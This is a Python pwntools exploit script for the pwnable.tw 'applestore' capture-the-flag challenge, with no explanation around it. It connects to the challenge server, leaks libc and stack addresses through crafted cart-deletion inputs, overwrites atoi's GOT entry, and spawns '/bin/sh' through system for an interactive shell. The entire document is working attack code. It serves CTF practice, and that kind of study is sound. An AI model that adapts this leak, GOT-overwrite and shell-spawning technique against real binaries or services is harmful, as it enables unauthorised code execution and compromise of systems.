from pwn import *
def cmd(c):
	p.sendlineafter("> ",str(c))
def add(idx=1):
	cmd(2)
	p.sendlineafter("ber> ",str(idx))
def show(c='y'):
	cmd(4)
	p.sendlineafter("n) > ",c)
def free(c):
	cmd(3)
	p.sendafter("ber> ",c)
def pay():
	cmd(5)
	p.sendlineafter("n) > ","y")
context.log_level='debug'		
atoi=0x804b040
#p=process("./applestore",env={'LD_PRELOAD':'./libc_32.so.6'})
p=remote("chall.pwnable.tw",10104)
for x in range(6):
	add()
for x in range(20):
	add(2)

pay()

free("27"+p32(atoi)+p64(0)*2+"\n")
p.readuntil("27:")
base=u32(p.read(4))-(0xf7643050-0xf7616000)
log.warning(hex(base))
#gdb.attach(p)
#libc=ELF("/lib/i386-linux-gnu/libc.so.6")
libc=ELF("./libc_32.so.6")
libc.address=base


free("27"+p32(libc.symbols['environ'])+p64(0)*2+"\n")
p.readuntil("27:")
stack=u32(p.read(4))-(0xffffd0fc-0xfffdd000)
log.warning(hex(stack))
ebp=0xffffcff8-0xfffdd000+stack

#free("27"+p32(0x0804b000)+p32(0)+p32(0)+p32(0)+p32(0)+'\n')
free("27"+p32(0x0804b000)+p32(0xdeadbeef)+p32(ebp-12)+p32(atoi+0x22)+'\n')
cmd(p32(libc.symbols['system'])+";"+'/bin/sh;')
#gdb.attach(p,'b * 0x8048A44')
p.interactive("nier >>>")

 


